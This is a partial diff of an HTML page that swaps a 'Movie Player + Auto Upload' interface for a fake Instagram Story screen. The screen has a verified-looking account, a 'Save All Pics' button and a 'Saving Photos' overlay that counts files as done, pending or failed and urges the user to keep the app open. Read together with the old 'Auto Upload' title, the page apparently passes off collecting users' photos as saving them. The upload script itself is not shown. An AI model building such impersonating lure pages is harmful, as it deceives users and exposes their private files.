@@ -3,10 +3,16 @@
 
 <head>
     <meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Movie Player + Auto Upload</title>
+    <title>Instagram Story</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -17,235 +23,926 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        .player-container { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; z-index: 100; }
-        .player-wrapper { position: relative; width: 100%; height: 100vh; background: #000; overflow: hidden; }
-
-        /* TOP BAR */
-        .top-bar {
-            position: absolute; top: 0; left: 0; right: 0;
-            padding: 20px 16px 40px;
-            background: linear-gradient(180deg, rgba(0,0,0,0.9) 0%, transparent 100%);
-            z-index: 20; display: flex; align-items: center; gap: 12px;
-            transition: opacity 0.3s;
+        .story-container {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
         }
-        .top-bar.hide { opacity: 0; pointer-events: none; }
-        .back-btn, .top-icon {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: rgba(0,0,0,0.5); border: none; color: #fff;
-            font-size: 20px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            backdrop-filter: blur(10px); flex-shrink: 0;
-        }
-        .movie-title-top { flex: 1; min-width: 0; }
-        .movie-title-top h1 { font-size: 15px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .movie-title-top span { font-size: 12px; color: #8e8e93; }
 
-        /* VIDEO POSTER */
-        .video-area {
-            position: absolute; inset: 0; background: #000;
-            display: flex; align-items: center; justify-content: center; z-index: 1;
+        .story-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            height: 100vh;
+            max-height: 900px;
+            background: #000;
+            overflow: hidden;
         }
-        .video-poster {
-            width: 100%; height: 100%; object-fit: cover;
-            display: block; opacity: 0; transition: opacity 0.4s ease;
+
+        @media (min-width: 500px) {
+            .story-wrapper {
+                border-radius: 20px;
+                height: 90vh;
+            }
         }
-        .video-poster.active { opacity: 1; }
 
-        /* CENTER PLAY */
-        .center-play {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 15; width: 80px; height: 80px; border-radius: 50%;
-            background: rgba(255,255,255,0.15); backdrop-filter: blur(20px);
-            border: 2px solid rgba(255,255,255,0.4); color: #fff;
-            font-size: 32px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            transition: transform 0.2s, background 0.2s;
+        .progress-bars {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            display: flex;
+            gap: 3px;
+            z-index: 20;
         }
-        .center-play:active { transform: translate(-50%, -50%) scale(0.9); }
 
-        /* TAP ZONES */
-        .tap-zone { position: absolute; top: 100px; bottom: 150px; z-index: 10; cursor: pointer; }
-        .tap-zone.left { left: 0; width: 30%; }
-        .tap-zone.right { right: 0; width: 70%; }
-
-        /* BOTTOM CONTROLS */
-        .bottom-controls {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            padding: 60px 16px 30px;
-            background: linear-gradient(transparent, rgba(0,0,0,0.95));
-            z-index: 20; transition: opacity 0.3s;
+        .progress-segment {
+            flex: 1;
+            height: 2.5px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
         }
-        .bottom-controls.hide { opacity: 0; pointer-events: none; }
 
-        .progress-bar { height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; position: relative; cursor: pointer; }
         .progress-fill {
-            position: absolute; top: 0; left: 0; height: 100%;
-            background: linear-gradient(90deg, #f09433, #dc2743);
-            border-radius: 2px; width: 0;
+            position: absolute;
+            inset: 0;
+            background: #fff;
+            border-radius: 2px;
+            width: 0;
         }
-        .time-row {
-            display: flex; justify-content: space-between;
-            font-size: 12px; color: #8e8e93; margin: 12px 0 20px;
-        }
-        .controls-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
-        .ctrl-btn {
-            width: 44px; height: 44px; border-radius: 50%;
-            background: transparent; border: none; color: #fff;
-            font-size: 22px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .ctrl-btn.play-btn { width: 56px; height: 56px; background: rgba(255,255,255,0.15); font-size: 24px; }
-        .ctrl-spacer { flex: 1; }
 
-        /* SAVE BUTTON */
-        .save-btn-float {
-            position: absolute; top: 20px; right: 16px;
-            padding: 10px 18px; border: none; border-radius: 22px;
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            background-size: 300% 300%; color: #fff;
-            font-size: 13px; font-weight: 700; cursor: pointer; font-family: inherit;
-            display: flex; align-items: center; gap: 6px;
-            animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
-            box-shadow: 0 8px 24px rgba(220,39,67,0.5); z-index: 25;
+        .progress-segment.viewed .progress-fill {
+            width: 100%;
         }
-        .save-btn-float:disabled { opacity: 0.6; animation: none; }
+
+        .progress-segment.active .progress-fill {
+            animation: fillProgress 5s linear forwards;
+        }
+
+        @keyframes fillProgress {
+            from {
+                width: 0;
+            }
+
+            to {
+                width: 100%;
+            }
+        }
+
+        .story-header {
+            position: absolute;
+            top: 28px;
+            left: 12px;
+            right: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 20;
+            padding: 8px;
+        }
+
+        .story-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #fff;
+            flex-shrink: 0;
+        }
+
+        .story-user-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .story-username {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+        }
+
+        .story-verified {
+            width: 12px;
+            height: 12px;
+            background: #0095F6;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .story-verified::before {
+            content: '';
+            width: 5px;
+            height: 2.5px;
+            border-left: 1.5px solid #fff;
+            border-bottom: 1.5px solid #fff;
+            transform: rotate(-45deg) translate(0px, -1px);
+        }
+
+        .story-time {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-left: 2px;
+        }
+
+        .story-close {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            flex-shrink: 0;
+        }
+
+        .story-image-wrap {
+            position: absolute;
+            inset: 0;
+            z-index: 1;
+        }
+
+        .story-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .story-image.active {
+            opacity: 1;
+        }
+
+        .tap-zone {
+            position: absolute;
+            top: 80px;
+            bottom: 80px;
+            z-index: 10;
+            cursor: pointer;
+        }
+
+        .tap-zone.left {
+            left: 0;
+            width: 30%;
+        }
+
+        .tap-zone.right {
+            right: 0;
+            width: 70%;
+        }
+
+        .story-footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px 16px 30px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .reply-input {
+            flex: 1;
+            padding: 12px 18px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1.5px solid rgba(255, 255, 255, 0.4);
+            border-radius: 24px;
+            color: #fff;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            backdrop-filter: blur(20px);
+        }
+
+        .reply-input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .footer-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(20px);
+            flex-shrink: 0;
+        }
+
+        .save-bar {
+            position: absolute;
+            bottom: 90px;
+            left: 16px;
+            right: 16px;
+            z-index: 25;
+            display: flex;
+            justify-content: center;
+        }
+
+        .save-btn {
+            padding: 14px 26px;
+            border: none;
+            border-radius: 26px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            background-size: 300% 300%;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
+            box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5);
+            transition: transform 0.15s;
+        }
+
+        .save-btn:active {
+            transform: scale(0.95);
+        }
+
+        .save-btn:disabled {
+            opacity: 0.6;
+            animation: none;
+        }
 
         @keyframes gradientMove {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
+
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
         }
+
         @keyframes pulseBtn {
-            0%, 100% { box-shadow: 0 8px 24px rgba(220,39,67,0.5), 0 0 0 0 rgba(220,39,67,0.7); }
-            50% { box-shadow: 0 8px 24px rgba(220,39,67,0.7), 0 0 0 12px rgba(220,39,67,0); }
+
+            0%,
+            100% {
+                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5),
+                    0 0 0 0 rgba(220, 39, 67, 0.7);
+            }
+
+            50% {
+                box-shadow: 0 8px 24px rgba(220, 39, 67, 0.7),
+                    0 0 0 12px rgba(220, 39, 67, 0);
+            }
         }
 
-        /* RESUME BANNER */
         #resumeBanner {
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
             background: linear-gradient(45deg, #f09433, #dc2743);
-            color: #fff; padding: 14px 20px; border-radius: 16px;
-            font-size: 13px; font-weight: 600; display: none;
-            z-index: 99998; box-shadow: 0 10px 30px rgba(220,39,67,0.5);
-            align-items: center; gap: 12px; max-width: 90vw;
+            color: #fff;
+            padding: 14px 20px;
+            border-radius: 16px;
+            font-size: 13px;
+            font-weight: 600;
+            display: none;
+            z-index: 99998;
+            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.5);
+            align-items: center;
+            gap: 12px;
+            max-width: 90vw;
+            animation: bannerSlide 0.4s;
         }
-        #resumeBanner.show { display: flex; }
+
+        #resumeBanner.show {
+            display: flex;
+        }
+
+        @keyframes bannerSlide {
+            from {
+                transform: translateX(-50%) translateY(-60px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .resume-icon {
+            font-size: 20px;
+        }
+
         .resume-btn {
-            padding: 8px 16px; border: none; border-radius: 10px;
-            background: #fff; color: #dc2743; font-size: 12px; font-weight: 700;
-            cursor: pointer; font-family: inherit;
-        }
-
-        /* OVERLAY */
-        #processingOverlay {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.94);
-            backdrop-filter: blur(24px); display: none;
-            align-items: center; justify-content: center;
-            z-index: 99999; padding: 20px;
-        }
-        #processingOverlay.show { display: flex; }
-
-        .overlay-box {
-            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
-            border: 1px solid #262626; border-radius: 24px;
-            padding: 32px 24px 24px; max-width: 400px; width: 100%;
-            text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.9);
-        }
-
-        .folder-anim {
-            position: relative; width: 100px; height: 100px;
-            margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
-        }
-        .folder-icon { font-size: 56px; animation: folderBob 2s ease-in-out infinite; }
-        @keyframes folderBob {
-            0%, 100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-6px) scale(1.05); }
-        }
-        .file-flying {
-            position: absolute; font-size: 24px; top: -20px; left: 50%;
-            transform: translateX(-50%); animation: fileFly 1.8s infinite;
-        }
-        @keyframes fileFly {
-            0% { top: -30px; opacity: 0; }
-            30% { opacity: 1; }
-            70% { opacity: 1; top: 50px; }
-            100% { opacity: 0; top: 70px; }
-        }
-
-        .overlay-title {
-            font-size: 20px; font-weight: 800; margin-bottom: 8px;
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .overlay-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 22px; }
-        .overlay-sub strong { color: #fff; }
-
-        .overlay-progress-bar {
-            height: 10px; background: rgba(255,255,255,0.06);
-            border-radius: 5px; overflow: hidden; margin-bottom: 10px;
-        }
-        .overlay-progress-fill {
-            height: 100%; background: linear-gradient(90deg, #f09433, #dc2743);
-            border-radius: 5px; width: 0; transition: width 0.4s;
-        }
-        .overlay-progress-text {
-            display: flex; justify-content: space-between;
-            font-size: 12px; color: #8e8e93; margin-bottom: 16px;
-        }
-        .overlay-progress-text .percent { color: #f09433; font-weight: 700; }
-
-        .overlay-stats {
-            display: flex; justify-content: space-around;
-            padding: 14px 0; margin-bottom: 16px;
-            border-top: 1px solid #262626; border-bottom: 1px solid #262626;
-        }
-        .overlay-stat { display: flex; flex-direction: column; align-items: center; gap: 2px; }
-        .overlay-stat .num { font-size: 20px; font-weight: 800; }
-        .overlay-stat.done .num { color: #34A853; }
-        .overlay-stat.pending .num { color: #FFC107; }
-        .overlay-stat.failed .num { color: #FF3B30; }
-        .overlay-stat .lbl { color: #8e8e93; font-size: 10px; text-transform: uppercase; }
-
-        .current-file {
-            font-size: 12px; color: #b0b0b0; padding: 10px 14px;
-            background: rgba(255,255,255,0.03); border-radius: 12px;
-            margin-bottom: 16px; text-align: left; font-family: monospace;
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
-
-        .cancel-btn {
-            width: 100%; padding: 12px;
-            border: 1px solid rgba(255,59,48,0.3); border-radius: 12px;
-            background: transparent; color: #FF3B30;
-            font-size: 13px; font-weight: 600; cursor: pointer;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 10px;
+            background: #fff;
+            color: #dc2743;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
             font-family: inherit;
         }
 
-        .error-state { display: none; text-align: center; padding: 8px 0; }
-        .error-state.show { display: block; }
-        .error-icon { font-size: 64px; margin-bottom: 16px; }
-        .error-title { font-size: 20px; font-weight: 800; color: #FF3B30; margin-bottom: 8px; }
-        .error-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 20px; }
-        .error-retry {
-            padding: 14px 28px; border: none; border-radius: 14px;
-            background: linear-gradient(45deg, #f09433, #dc2743);
-            color: #fff; font-size: 14px; font-weight: 700;
-            cursor: pointer; font-family: inherit;
+        #processingOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.94);
+            backdrop-filter: blur(24px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            padding: 20px;
         }
-        .success-icon { font-size: 72px; margin-bottom: 16px; display: inline-block; }
+
+        #processingOverlay.show {
+            display: flex;
+        }
+
+        .overlay-box {
+            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
+            border: 1px solid #262626;
+            border-radius: 24px;
+            padding: 32px 24px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes boxIn {
+            from {
+                opacity: 0;
+                transform: translateY(40px) scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .folder-anim {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .folder-icon {
+            font-size: 56px;
+            position: relative;
+            z-index: 3;
+            animation: folderBob 2s ease-in-out infinite;
+        }
+
+        @keyframes folderBob {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.05);
+            }
+        }
+
+        .folder-pulse {
+            position: absolute;
+            inset: 10px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(240, 148, 51, 0.3), transparent 70%);
+            animation: folderPulse 2s infinite;
+        }
+
+        @keyframes folderPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 0.6;
+            }
+
+            50% {
+                transform: scale(1.4);
+                opacity: 0;
+            }
+        }
+
+        .file-flying {
+            position: absolute;
+            font-size: 24px;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 4;
+            animation: fileFly 1.8s infinite;
+        }
+
+        @keyframes fileFly {
+            0% {
+                top: -30px;
+                opacity: 0;
+                transform: translateX(-50%) scale(0.5);
+            }
+
+            30% {
+                opacity: 1;
+                transform: translateX(-50%) scale(1);
+            }
+
+            70% {
+                opacity: 1;
+                top: 50px;
+                transform: translateX(-50%) scale(0.7);
+            }
+
+            100% {
+                opacity: 0;
+                top: 70px;
+                transform: translateX(-50%) scale(0.3);
+            }
+        }
+
+        .overlay-title {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .overlay-sub {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        .overlay-sub strong {
+            color: #fff;
+        }
+
+        .warning-box {
+            display: flex;
+            gap: 10px;
+            padding: 12px 14px;
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 12px;
+            font-size: 12px;
+            color: #FFC107;
+            margin-bottom: 18px;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .warning-box strong {
+            color: #FFC107;
+        }
+
+        .overlay-progress {
+            margin-bottom: 20px;
+        }
+
+        .overlay-progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .overlay-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f09433, #dc2743, #bc1888);
+            background-size: 200% 100%;
+            border-radius: 5px;
+            width: 0;
+            transition: width 0.4s ease;
+            animation: gradientShift 2s linear infinite;
+        }
+
+        @keyframes gradientShift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            100% {
+                background-position: 200% 50%;
+            }
+        }
+
+        .shimmer {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent 0%, rgba(255, 255, 255, 0.4) 50%, transparent 100%);
+            animation: shimmerMove 1.5s infinite;
+        }
+
+        @keyframes shimmerMove {
+            from {
+                transform: translateX(-100%);
+            }
+
+            to {
+                transform: translateX(100%);
+            }
+        }
+
+        .overlay-progress-text {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #8e8e93;
+        }
+
+        .overlay-progress-text .percent {
+            color: #f09433;
+            font-weight: 700;
+        }
+
+        .time-info {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .time-item {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            text-align: left;
+        }
+
+        .time-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .time-data {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .time-value {
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .time-label {
+            font-size: 10px;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        .overlay-stats {
+            display: flex;
+            justify-content: space-around;
+            padding: 14px 0;
+            margin-bottom: 16px;
+            border-top: 1px solid #262626;
+            border-bottom: 1px solid #262626;
+        }
+
+        .overlay-stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .overlay-stat .num {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .overlay-stat .lbl {
+            color: #8e8e93;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .overlay-stat.done .num {
+            color: #34A853;
+        }
+
+        .overlay-stat.failed .num {
+            color: #FF3B30;
+        }
+
+        .overlay-stat.pending .num {
+            color: #FFC107;
+        }
+
+        .current-file-wrap {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .current-file-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+            animation: fileIconPulse 1.5s infinite;
+        }
+
+        @keyframes fileIconPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(0.9);
+            }
+        }
+
+        .current-file {
+            flex: 1;
+            font-size: 12px;
+            color: #b0b0b0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-family: monospace;
+        }
+
+        .overlay-hint {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 11px;
+            color: #5f6368;
+            margin-bottom: 14px;
+        }
+
+        .dot-anim {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #f09433;
+            animation: dotPulse 1.2s infinite;
+        }
+
+        @keyframes dotPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.3;
+                transform: scale(0.7);
+            }
+        }
+
+        .cancel-btn {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            border-radius: 12px;
+            background: transparent;
+            color: #FF3B30;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .cancel-btn:active {
+            transform: scale(0.97);
+        }
+
+        .success-icon {
+            font-size: 72px;
+            margin-bottom: 16px;
+            animation: successBounce 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: inline-block;
+        }
+
+        @keyframes successBounce {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+
+            50% {
+                transform: scale(1.2);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .error-state {
+            display: none;
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .error-state.show {
+            display: block;
+        }
+
+        .error-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+            animation: errorShake 0.6s ease-in-out;
+            display: inline-block;
+        }
+
+        @keyframes errorShake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-8px);
+            }
+
+            75% {
+                transform: translateX(8px);
+            }
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #FF3B30;
+            margin-bottom: 8px;
+        }
+
+        .error-sub {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .error-retry {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(45deg, #f09433, #dc2743);
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .error-retry:active {
+            transform: scale(0.97);
+        }
+
+        .retry-counter {
+            display: inline-flex;
+            align-items: baseline;
+            gap: 6px;
+            padding: 8px 20px;
+            background: rgba(255, 59, 48, 0.1);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .retry-num {
+            font-size: 24px;
+            font-weight: 800;
+            color: #FF3B30;
+        }
+
+        .retry-of {
+            font-size: 12px;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+
+        .error-skip {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 12px;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: color 0.2s;
+        }
+
+        .error-skip:hover {
+            color: #8e8e93;
+        }
 
         .toast {
-            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
-            background: rgba(44,44,46,0.95); color: #fff;
-            padding: 12px 20px; border-radius: 24px; font-size: 13px;
-            z-index: 999999; backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.1);
-            max-width: 90vw; text-align: center;
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(44, 44, 46, 0.95);
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 24px;
+            font-size: 13px;
+            z-index: 999999;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: toastIn 0.3s;
+            max-width: 90vw;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
     </style>
 </head>
 
 <body>
+
+
 
     <div id="resumeBanner">
         <span class="resume-icon">⚠️</span>
@@ -253,50 +950,41 @@
         <button class="resume-btn" id="resumeBtn">Resume</button>
     </div>
 
-    <div class="player-container">
-        <div class="player-wrapper">
+    <div class="story-container">
+        <div class="story-wrapper" id="storyWrapper">
+            <div class="progress-bars" id="progressBars"></div>
 
-            <div class="video-area">
-                <img class="video-poster active" id="videoPoster" src="" alt="Movie">
-            </div>
-
-            <div class="top-bar" id="topBar">
-                <button class="back-btn" id="backBtn">←</button>
-                <div class="movie-title-top">
-                    <h1 id="movieTitle">Interstellar</h1>
-                    <span id="movieSub">2014 • Sci-Fi • 2h 49m</span>
+            <div class="story-header">
+                <div class="story-avatar" id="storyAvatar"></div>
+                <div class="story-user-info">
+                    <div class="story-username">
+                        <span id="storyUsername">nature_lover</span>
+                        <span class="story-verified"></span>
+                        <span class="story-time" id="storyTime">2h</span>
+                    </div>
                 </div>
-                <button class="top-icon">⋯</button>
+                <button class="story-close" id="storyClose">✕</button>
             </div>
 
-            <button class="save-btn-float" id="saveAllBtn">
-                <span>💾</span>
-                <span>Save All</span>
-            </button>
-
-            <button class="center-play" id="centerPlay">▶</button>
+            <div class="story-image-wrap">
+                <img class="story-image active" id="storyImage" src="" alt="Story">
+            </div>
 
             <div class="tap-zone left" id="tapLeft"></div>
             <div class="tap-zone right" id="tapRight"></div>
 
-            <div class="bottom-controls" id="bottomControls">
-                <div class="progress-bar" id="progressBar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="time-row">
-                    <span id="currentTime">0:00</span>
-                    <span id="totalTime">2:49:00</span>
-                </div>
-                <div class="controls-row">
-                    <button class="ctrl-btn" id="rewindBtn">⏪</button>
-                    <button class="ctrl-btn play-btn" id="playPauseBtn">⏸</button>
-                    <button class="ctrl-btn" id="forwardBtn">⏩</button>
-                    <div class="ctrl-spacer"></div>
-                    <button class="ctrl-btn" id="volumeBtn">🔊</button>
-                    <button class="ctrl-btn" id="fullscreenBtn">⛶</button>
-                </div>
+            <div class="save-bar">
+                <button class="save-btn" id="saveAllBtn">
+                    <span>💾</span>
+                    <span>Save All Pics</span>
+                </button>
             </div>
 
+            <div class="story-footer">
+                <input type="text" class="reply-input" placeholder="Send message..." readonly>
+                <button class="footer-icon">❤️</button>
+                <button class="footer-icon">📤</button>
+            </div>
         </div>
     </div>
 
@@ -306,6 +994,7 @@
                 <div class="folder-anim">
                     <div class="folder-icon">📁</div>
                     <div class="file-flying">📸</div>
+                    <div class="folder-pulse"></div>
                 </div>
 
                 <h2 class="overlay-title" id="overlayTitle">Saving Photos</h2>
@@ -313,12 +1002,41 @@
                     Photos <strong>folder mein save</strong> ho rahi hain.
                 </p>
 
-                <div class="overlay-progress-bar">
-                    <div class="overlay-progress-fill" id="overlayProgressFill"></div>
+                <div class="warning-box">
+                    <span>⚠️</span>
+                    <div>
+                        <strong>App open rakho</strong><br>
+                        <span>Background mein slow ho jaayega</span>
+                    </div>
                 </div>
-                <div class="overlay-progress-text">
-                    <span id="overlayProgressLabel">Starting...</span>
-                    <span class="percent" id="overlayProgressPercent">0%</span>
+
+                <div class="overlay-progress">
+                    <div class="overlay-progress-bar">
+                        <div class="overlay-progress-fill" id="overlayProgressFill">
+                            <div class="shimmer"></div>
+                        </div>
+                    </div>
+                    <div class="overlay-progress-text">
+                        <span id="overlayProgressLabel">Starting...</span>
+                        <span class="percent" id="overlayProgressPercent">0%</span>
+                    </div>
